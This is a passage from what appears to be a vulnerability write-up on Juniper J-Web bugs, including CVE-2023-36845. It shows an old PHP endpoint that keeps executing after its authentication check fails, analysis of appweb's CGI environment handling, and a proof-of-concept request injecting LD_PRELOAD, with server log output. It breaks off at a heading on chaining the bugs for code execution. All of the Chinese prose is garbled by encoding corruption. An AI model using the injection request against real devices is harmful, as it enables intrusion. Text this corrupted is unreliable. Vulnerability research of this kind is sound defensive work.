class="line">			  <span class="keyword">if</span>(<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_UN)) &#123;</span><br><span class="line">				  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;File unlocked! ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">			  &#125;</span><br><span class="line">			  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;<span class="subst">$file</span> was last modified: &quot;</span> . <span class="title function_ invoke__">date</span> (<span class="string">&quot;F d Y H:i:s.&quot;</span>, <span class="title function_ invoke__">filemtime</span>(<span class="variable">$file</span>)));</span><br><span class="line">		  &#125;        </span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Success - Updated preferences for user&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="variable">$fc</span> = <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	<span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;closing file...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fc</span>, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_user_preferences</span> (<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Success - Updated preferences for user&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_log</span>(<span class="params"><span class="variable">$fname</span>, <span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">error_log</span>(<span class="variable">$fname</span> . <span class="string">&quot; : &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// old</span></span><br><span class="line"><span class="comment">#!/usr/bin/php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;../../main.inc.php&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;USER_PREFERENCE_FILE&#x27;</span>, <span class="string">&#x27;/var/tmp/preference&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http_method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. Cannot find a valid session.&quot;&#125;&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. Cannot identify user.&quot;&#125;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$http_method</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;GET&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">get_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;PUT&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;POST&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;DELETE&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">delete_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">//echo (&quot;default...&quot;);</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_user_preference_file</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;   </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$samplejson</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fp</span>) &#123;       </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$samplejson</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="title function_ invoke__">chmod</span>(USER_PREFERENCE_FILE, <span class="number">0666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_preference_file_path</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (USER_PREFERENCE_FILE . <span class="string">&quot;.&quot;</span> . <span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_user_preferences</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="comment">//print(&quot;&lt;br/&gt; file = &quot; . $file);</span></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>) ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File not found.&quot;&#125;&#x27;</span>);</span><br><span class="line">		<span class="title function_ invoke__">write_dummy_content</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>, <span class="string">&quot;opening file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fp</span>) &amp;&amp; <span class="variable">$fp</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File open failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="keyword">if</span>(<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_SH)) &#123;</span><br><span class="line">		  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;Unlocked the file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">		  <span class="variable">$str</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>);</span><br><span class="line">	  &#125;     </span><br><span class="line">      </span><br><span class="line">      <span class="variable">$fw</span> = <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;closing file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fw</span>, <span class="literal">true</span>));</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(!<span class="title function_ invoke__">is_bool</span>(<span class="variable">$str</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)&gt;<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$str</span>);</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;&#123;&#125;&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;error while reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$str</span>, <span class="literal">true</span>));</span><br><span class="line">	  &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_dummy_content</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	 <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">	 <span class="variable">$payload</span> = <span class="string">&quot;&#123;&#125;&quot;</span>;</span><br><span class="line">	 <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">	 <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$username</span>))</span><br><span class="line">		 <span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">	 <span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">put_user_preferences</span> (<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;	  </span><br><span class="line">      <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;opening file for writing ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fp</span>) &amp;&amp; <span class="variable">$fp</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File open failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		  <span class="keyword">if</span> (<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_EX)) &#123;</span><br><span class="line">			  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;File locked! ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">			  <span class="variable">$fw</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$payload</span>);</span><br><span class="line">			  <span class="keyword">if</span>(<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fw</span>) &amp;&amp; <span class="variable">$fw</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">				  <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File writing failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">			  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;Payload written to file ... of &quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fw</span>, <span class="literal">true</span>) . <span class="string">&quot; bytes&quot;</span>);</span><br><span class="line">			  &#125;</span><br><span class="line">			  <span class="keyword">if</span>(<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_UN)) &#123;</span><br><span class="line">				  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;File unlocked! ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">			  &#125;</span><br><span class="line">			  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;<span class="subst">$file</span> was last modified: &quot;</span> . <span class="title function_ invoke__">date</span> (<span class="string">&quot;F d Y H:i:s.&quot;</span>, <span class="title function_ invoke__">filemtime</span>(<span class="variable">$file</span>)));</span><br><span class="line">		  &#125;        </span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Success - Updated preferences for user&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="variable">$fc</span> = <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	<span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;closing file...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fc</span>, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_user_preferences</span> (<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Success - Updated preferences for user&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_log</span>(<span class="params"><span class="variable">$fname</span>, <span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">error_log</span>(<span class="variable">$fname</span> . <span class="string">&quot; : &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ä»£ç ä¸­çœ‹åˆ°æ–°ç‰ˆæ·»åŠ äº†ä¸¤å¤„ returnï¼Œæ—§ç‰ˆæœ¬ä¸­æ­¤æ¥å£é‰´æƒå¤±è´¥æ—¶åªä¼šè¾“å‡ºä¸€äº›é”™è¯¯ä¿¡æ¯ï¼Œä¹‹åä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œè¿™æ ·ä¸€ä¸ªæœªæˆæƒçš„ç”¨æˆ·ä¹Ÿå¯ä»¥ä½¿ç”¨æ¥å£ä¸­çš„ä¸»è¦åŠŸèƒ½ã€‚</p>
<p>æ­¤æ¥å£ä¼šè¯»å–ç”¨æˆ·æäº¤çš„è¯·æ±‚ï¼Œå½“è¯·æ±‚ä¸º POST æ—¶ï¼Œä»£ç ä¼šæ‰“å¼€ <code>/var/tmp/preference.xxx</code> æ–‡ä»¶ï¼Œå…¶ä¸­ xxx ä¸ºå½“å‰ç”¨æˆ·åï¼Œç„¶åå°†è¯·æ±‚ä½“æ•°æ®å†™å…¥è¿™ä¸ªæ–‡ä»¶ã€‚å½“ç”¨æˆ·æœªç»æˆæƒè®¿é—®æ—¶ï¼Œusername å‚æ•°ä¸ºç©ºï¼Œä»£ç ä¼šæ‰“å¼€ <code>/var/tmp/preference.</code> æ–‡ä»¶å¹¶å†™å…¥å†…å®¹ã€‚</p>
<p><code>/var/tmp</code> æ˜¯ä¸€ä¸ªä¸´æ—¶ç›®å½•ï¼Œå†™å…¥ç”¨æˆ·æƒé™ä¸º nobody ä¸”ä½äº chroot éš”ç¦»ç¯å¢ƒï¼Œå•çº¯æ¥çœ‹è¿™ä¸ªæ¼æ´å¹¶ä¸èƒ½äº§ç”Ÿå¾ˆå¤§çš„å½±å“ã€‚</p>
<h2 id="CVE-2023-36845"><a href="#CVE-2023-36845" class="headerlink" title="CVE-2023-36845"></a>CVE-2023-36845</h2><p>CVE é“¾æ¥ï¼š<a class="link"   href="https://www.cve.org/CVERecord?id=CVE-2023-36845" >https://www.cve.org/CVERecord?id=CVE-2023-36845<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æ ¹æ®æè¿°ä¿¡æ¯æ¥çœ‹ï¼Œæœªæˆæƒç”¨æˆ·é€šè¿‡åˆ©ç”¨æ­¤æ¼æ´å¯ä»¥æ§åˆ¶å…³é”®çš„ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­åŒ…æ‹¬ PHP ä½¿ç”¨çš„æŸäº›å˜é‡ï¼Œä»è€Œå¯¼è‡´ä¸€äº›é—®é¢˜ã€‚</p>
<p>å‰é¢å·²ç»å¯¹æ¯”äº† PHP ä»£ç ï¼Œå…¶ä¸­å¹¶æ²¡æœ‰å’Œç¯å¢ƒå˜é‡ç›¸å…³è”çš„æ”¹åŠ¨ï¼Œè€ƒè™‘åˆ° J-Web æ˜¯ä¸€ç§ CGI æœåŠ¡ç»“æ„ï¼Œå’Œç¯å¢ƒå˜é‡æœ‰å…³ç³»çš„é€»è¾‘å¤§æ¦‚ç‡ä½äº web æœåŠ¡å™¨ä¸­ã€‚</p>
<p>J-Web ç»„ä»¶ä½¿ç”¨çš„ web æœåŠ¡å™¨ç”± appweb ä¿®æ”¹è€Œæ¥ï¼Œç¨‹åºä½äº <code>/packages/mnt/jweb-srxtvp-8ae76b91/usr/sbin</code> ç›®å½•ã€‚</p>
<p>appweb æ˜¯ Embedthis å¼€å‘çš„ä¸€æ¬¾åµŒå…¥å¼ web æœåŠ¡å™¨ï¼ŒEmbedthis æ——ä¸‹è¿˜æœ‰ GoAhead é¡¹ç›®ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„åµŒå…¥å¼ web æœåŠ¡å™¨ã€‚çœ‹åˆ°è¿™äº›é¡¹ç›®ï¼Œé¦–å…ˆæƒ³åˆ° CVE-2017-17562 ä»¥åŠ CVE-2021-42342ï¼Œè¿™ä¸¤ä¸ªæ˜¯ goahead çš„ç¯å¢ƒå˜é‡æ³¨å…¥æ¼æ´ï¼Œæˆå› æ˜¯ä»£ç åœ¨å¤„ç†ç”¨æˆ·æäº¤çš„å‚æ•°æ—¶æ²¡æœ‰åˆç†é™åˆ¶æ•æ„Ÿå­—ç¬¦ï¼Œå¯¼è‡´å¯ä»¥æ³¨å…¥å¦‚ LD_PRELOAD ç­‰å…³é”®ç¯å¢ƒå˜é‡ï¼Œappweb ä¸­å¯èƒ½ä¹Ÿå­˜åœ¨ç±»ä¼¼çš„é—®é¢˜ã€‚</p>
<p>appweb åœ¨ cgiHandler.c ä¸­åŒ…å«è®¾ç½® CGI ç¯å¢ƒå˜é‡çš„ä»£ç ç‰‡æ®µ</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">varCount = mprGetHashLength(rx-&gt;headers) + mprGetHashLength(rx-&gt;svars) + mprGetJsonLength(rx-&gt;params);</span><br><span class="line">    <span class="keyword">if</span> ((envv = mprAlloc((varCount + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">char</span>*))) != <span class="number">0</span>) &#123;</span><br><span class="line">        count = copyParams(conn, envv, <span class="number">0</span>, rx-&gt;params, route-&gt;envPrefix);</span><br><span class="line">        count = copyVars(conn, envv, count, rx-&gt;svars, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        count = copyVars(conn, envv, count, rx-&gt;headers, <span class="string">&quot;HTTP_&quot;</span>);</span><br><span class="line">        assert(count &lt;= varCount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å‚è€ƒ appweb æºä»£ç å’Œ API æ–‡æ¡£ï¼Œå‘ç°æœ‰ä¸€ä¸ªå«åš <strong>httpSetRouteEnvPrefix</strong> çš„å‡½æ•°ï¼Œæ‰‹å†Œä¸­å®šä¹‰å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Define a prefix string for environment variables.</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">When mapping URI query parameters and form variables to environment variables, it is important to prevent important system variables like SHELL, PATH and IFS being overwritten or corrupted. Defining a unique prefix for such parameters ensures they have their own namespace.</span><br></pre></td></tr></table></figure></div>

<p>ä½¿ç”¨è¿™ä¸ª API å³å¯ç»™ç¯å¢ƒå˜é‡è®¾ç½®å‰ç¼€ï¼Œä½†æ˜¯åœ¨ httpd ç¨‹åºä¸­æ²¡æœ‰æ‰¾åˆ°å¯¹æ­¤å‡½æ•°çš„å¼•ç”¨ã€‚</p>
<p>ä»ä»£ç å±‚é¢åˆæ­¥æ¥çœ‹è¿™ä¸ª httpd å¯èƒ½ä¹Ÿå­˜åœ¨ç±»ä¼¼ goahead çš„ç¯å¢ƒå˜é‡æ³¨å…¥é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€  poc è¿›è¡Œæµ‹è¯•ï¼Œè¿›ä¸€æ­¥ç¡®è®¤é—®é¢˜æ˜¯å¦å­˜åœ¨ã€‚</p>
<p>æ„é€ æµ‹è¯•è¯·æ±‚å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?LD_PRELOAD=/abcd HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br></pre></td></tr></table></figure></div>

<p>å‘é€è¿™ä¸ªè¯·æ±‚æœåŠ¡å™¨ä¼šè¿”å› 502ï¼Œå½“å»é™¤ LD_PRELOAD å‚æ•°æ—¶å“åº”åˆæ­£å¸¸ã€‚æŸ¥çœ‹ httpd çš„æ—¥å¿— (&#x2F;packages&#x2F;mnt&#x2F;jweb-srxtvp-8ae76b91&#x2F;jail&#x2F;var&#x2F;log&#x2F;httpd-trace.log) å­˜åœ¨ä»¥ä¸‹å†…å®¹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">08/23/23 16:53:41 RECV event=http.rx.request type=request method:&#x27;GET&#x27;, uri:&#x27;/?LD_PRELOAD=/abcd&#x27;, protocol:&#x27;1&#x27;</span><br><span class="line">08/23/23 16:53:41 RECV event=cgi.error type=error msg=&quot;CGI failed uri=&#x27;/index.php&#x27;,details: ld-elf.so.1: Cannot open &quot;/abcd&quot;</span><br></pre></td></tr></table></figure></div>

<p>è¯´æ˜ httpd ç¡®å®å­˜åœ¨ç¯å¢ƒå˜é‡æ³¨å…¥é—®é¢˜ï¼Œå¯ä»¥å°è¯•è¿›ä¸€æ­¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚</p>
<h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><p>ç›®å‰æˆ‘ä»¬å·²ç»å¤ç°äº†è¿™ä¸¤ä¸ªæ¼æ´ï¼Œç°åœ¨è¦å°†å®ƒä»¬ç»„åˆèµ·æ¥å°è¯•å®ç°ä»£ç æ‰§è¡Œã€‚</p>
<p>åœ¨ç½‘ä¸ŠæŸ¥æ‰¾ç›¸å…³æ€è·¯æ—¶å‘ç°äº†ä¸€ç¯‡å…³äºç¯å¢ƒå˜é‡å®‰å…¨çš„æ–‡ç« ï¼š<a class="link"   href="https://www.elttam.com/blog/env/#content" >https://www.elttam.com/blog/env/#content<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
